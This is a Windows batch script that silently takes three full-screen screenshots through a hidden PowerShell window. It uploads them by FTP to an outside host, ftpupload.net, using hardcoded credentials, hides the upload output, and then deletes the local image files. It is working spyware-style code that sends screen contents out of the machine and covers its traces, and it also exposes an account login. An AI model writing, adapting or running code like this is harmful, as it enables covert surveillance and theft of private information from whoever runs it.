@echo off
setlocal enabledelayedexpansion

:: Get the directory of the batch file
set "batchDir=%~dp0"

:: Set the number of screenshots to be taken
set "numScreenshots=3"

:: Set FTP server details
set "ftpServer=ftpupload.net"
set "ftpUser=thsi_37027586"
set "ftpPass=HZP??GKY"
set "ftpDir=/htdocs/Upload"

for /L %%i in (1,1,%numScreenshots%) do (
    powershell -WindowStyle Hidden -Command "Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $bitmap = New-Object System.Drawing.Bitmap ([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height); $graphics = [System.Drawing.Graphics]::FromImage($bitmap); $graphics.CopyFromScreen([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Location, [System.Drawing.Point]::Empty, $bitmap.Size); $bitmap.Save('%batchDir%screenshot_%%i.png'); $graphics.Dispose(); $bitmap.Dispose();"
    timeout /t 1 >nul
)

:: Upload screenshots using separate FTP connections
for /L %%i in (1,1,%numScreenshots%) do (
    (
    echo user %ftpUser% %ftpPass%
    echo binary
    echo cd %ftpDir%
    echo put %batchDir%screenshot_%%i.png
    echo quit
    ) | ftp -n -v %ftpServer% >NUL 2>&1
    
    if %errorlevel% equ 0 (
        echo Screenshot %%i uploaded successfully.
    ) else (
        echo Failed to upload screenshot %%i.
    )
    
    timeout /t 2 >nul
)

set "ftpSuccess=1"

:: Delete the screenshots
for /L %%i in (1,1,%numScreenshots%) do (
    del /f /q "%batchDir%screenshot_%%i.png"
)

endlocal
